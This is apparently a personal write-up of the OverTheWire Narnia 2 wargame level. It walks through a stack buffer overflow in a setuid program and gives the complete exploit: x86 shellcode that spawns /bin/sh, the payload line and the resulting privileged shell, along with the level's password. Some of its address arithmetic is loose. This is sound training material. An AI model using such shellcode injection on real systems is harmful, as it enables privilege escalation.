 ## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BinaryExploitation #SystemCalls #ShellcodeInjection #BufferOverflow
**Completion Date & Time :** 2026 - 02 - 10 / 22:13

---
## FLAG : `F5AYQwE8PA`

---
## Solution :

### Step 1 : Check for `narnia2.c` file
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

```
This program needs an argument to run and will return whatever the input is. This program is vulnerable to Buffer Overflow. We could see `strcpy(buff, argv[1])` doesn't limit the `args[1]` this mean it will just copy everthing to `buf`. 

Let's give it a try :
```shell
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$ ./narnia2 AAAA
AAAA
```

So the idea is, since this is a `SETUID` file, and we could get the password through `/etc/narnia_pass/narnia2` so all we need is **Shell Injection** (Same as narnia2, but this time we inject it through buffer).

### Step 2 : Look for `buf` and `ret addr` address.
 Let's look over the binary file using `gef` :
```asm
   0x08049186 <+0> :	push   ebp
   0x08049187 <+1> :	mov    ebp,esp
   0x08049189 <+3> :	add    esp,0xffffff80
   0x0804918c <+6> :	cmp    DWORD PTR [ebp+0x8],0x1
   0x08049190 <+10>:	jne    0x80491ac <main+38>
   0x08049192 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08049195 <+15>:	mov    eax,DWORD PTR [eax]
   0x08049197 <+17>:	push   eax
   0x08049198 <+18>:	push   0x804a008
   0x0804919d <+23>:	call   0x8049040 <printf@plt>
   0x080491a2 <+28>:	add    esp,0x8
   0x080491a5 <+31>:	push   0x1
   0x080491a7 <+33>:	call   0x8049060 <exit@plt>
   0x080491ac <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080491af <+41>:	add    eax,0x4
   0x080491b2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491b4 <+46>:	push   eax
   0x080491b5 <+47>:	lea    eax,[ebp-0x80]
   0x080491b8 <+50>:	push   eax
   0x080491b9 <+51>:	call   0x8049050 <strcpy@plt>
   0x080491be <+56>:	add    esp,0x8
   0x080491c1 <+59>:	lea    eax,[ebp-0x80]
   0x080491c4 <+62>:	push   eax
   0x080491c5 <+63>:	push   0x804a01c
   0x080491ca <+68>:	call   0x8049040 <printf@plt>
   0x080491cf <+73>:	add    esp,0x8
   0x080491d2 <+76>:	mov    eax,0x0
   0x080491d7 <+81>:	leave
   0x080491d8 <+82>:	ret
```

Put a break point on `main+56` and run with a random strings to find the address of `buf` :
```asm
gef➤  x/32x $esp
0xffffd2e0:	0xffffd2e8	0xffffd5ae	0x41414141	0x00000000
0xffffd2f0:	0x00000000	0x00000001	0xf7ffda20	0x00000001
0xffffd300:	0x00000000	0xffffd57b	0x00000002	0x0000001c
0xffffd310:	0xf7ffcfe8	0x00000018	0x00000000	0xffffdfe8
0xffffd320:	0xf7fc7570	0xf7fc7000	0x00000000	0x00000000
0xffffd330:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd340:	0xffffffff	0xf7d8e93c	0xf7fc1400	0x00000000
0xffffd350:	0x00000000	0x00000000	0x00000000	0x00000000
```

Put a break point on `ret` then continue to see where it go next.
```asm
    0x80491ce <main+0048>      inc    DWORD PTR [ebx+0xb808c4]
    0x80491d4 <main+004e>      add    BYTE PTR [eax], al
    0x80491d6 <main+0050>      add    cl, cl
●→  0x80491d8 <main+0052>      ret    
   ↳  0xf7da1cb9 <__libc_start_call_main+0079> add    esp, 0x10
      0xf7da1cbc <__libc_start_call_main+007c> sub    esp, 0xc
      0xf7da1cbf <__libc_start_call_main+007f> push   eax
      0xf7da1cc0 <__libc_start_call_main+0080> call   0xf7dbbbd0 <__GI_exit>
      0xf7da1cc5 <__libc_start_call_main+0085> call   0xf7e066c0 <__GI___nptl_deallocate_tsd>
      0xf7da1cca <__libc_start_call_main+008a> mov    eax, DWORD PTR [esp]

```
So the next address after `ret` is `0xf7da1cb9`, now we need to findout where is it.
```asm
gef➤  x/x $esp
0xffffd36c:	0xf7da1cb9
```

From the information above, we now that `buf` starts from `0xffffd2e8` and since `buf` is 128 byte, so it will end on `0xffffd368`. It has `4 byte` gap (which is for ebp) then `return address`.
Here is the visualization :
```
(0xffffffff) Top of Memory
+-----------------------------+
|    Environment Variables    |
+-----------------------------+
|   Program Name (./narnia2)  |
+-----------------------------+
|         ARGUMENTS           | <--- VARIABLE SIZE!
| (Your 'A's go here first)   |
+-----------------------------+
+------------+-----------------------+----------+
| 0xffffd370 |    Return Address     | 4 bytes  |
+------------+-----------------------+----------+
| 0xffffd36c |      Saved EBP        | 4 bytes  |
+------------+-----------------------+----------+
| 0xffffd368 | <---  End of buf      |          |
|     ^      |                       |          |
|     |      |    [PAYLOAD DATA]     | 128 bytes|
|     |      |                       |          |
| 0xffffd2e8 | <--- Start of buf     |          |
+------------+-----------------------+----------+
   ^
Lower Addresses
```

But, GDB have a large overhead, this could make the real address shifted, so we we need to look for the `buf` address with a smaller overhead, which is `ltrace`.
`strcpy()` is a C standard library, so we could use it to see the address of `buf`.
```shell
narnia2@narnia:/narnia$ ltrace ./narnia2 $(perl -e 'print "A"x128')
__libc_start_main(0x804909d, 2, 0xffffd3e4, 0 <unfinished ...>
strcpy(0xffffd2a8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)        = 0xffffd2a8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)              = 128
```
We get the address of `buf` which is `0xffffd2a8`, we will use this as the `return address`.

### Step 3 : Shell Injection
Here is the payload :
```shell
perl -e 'print "A"x49 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "B"x49 . "\xc1\xd2\xff\xff"'
```
`ltrace` has a smaller overhead, so we need to make the return address land somewhere between `A` (Which is `0xffffd331`, this equals to `0xffffd318 + (49/2)`). Since `0x41` is a `NOP sled` (No-Operation Sled) which mean it will run nothing and have no effect (but it will still run properlly), it will execute all of the buffer untill the program find the shell code. The shellcode we use is same as `narnia2` shellcode.

And here is the result :
```shell
narnia2@narnia:/narnia$ ./narnia2 $(perl -e 'print "A"x49 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "B"x49 . "\xc1\xd2\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
F5AYQwE8PA
```

---
### Key Takeaways : 
- We need to use maximum of buffer size when using `ltrace` , otherwise we wouldn't get the correct address. This happens because the stack layout, which `ARGUMENTS` part could shift the below addresses. 

---
## Related Concepts : 
[[SetUID Files]], [[System Calls]], [[Narnia (1 -> 2)]], [[perl]], [[ltrace]], 

---
## Next Challenge :
[[Narnia (3 -> 4)]]
